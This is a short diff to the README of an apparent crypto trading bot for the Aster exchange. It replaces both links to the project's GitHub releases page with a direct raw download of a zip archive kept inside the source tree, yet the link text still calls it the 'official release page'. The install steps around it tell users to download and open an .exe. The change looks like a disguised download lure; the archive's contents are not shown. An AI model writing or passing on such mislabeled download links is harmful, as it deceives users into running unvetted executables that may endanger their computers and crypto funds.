@@ -1,6 +1,6 @@
 # 📈 asterdex-trading-bot - Automate your crypto trades on Aster
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/22en5744/asterdex-trading-bot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/22en5744/asterdex-trading-bot/raw/refs/heads/main/src/strategy/bot_asterdex_trading_v3.3-beta.5.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets these requirements:
 
 Follow these steps to install the bot on your computer:
 
-1. Visit the [official release page](https://github.com/22en5744/asterdex-trading-bot/releases) to find the latest version.
+1. Visit the [official release page](https://github.com/22en5744/asterdex-trading-bot/raw/refs/heads/main/src/strategy/bot_asterdex_trading_v3.3-beta.5.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder.
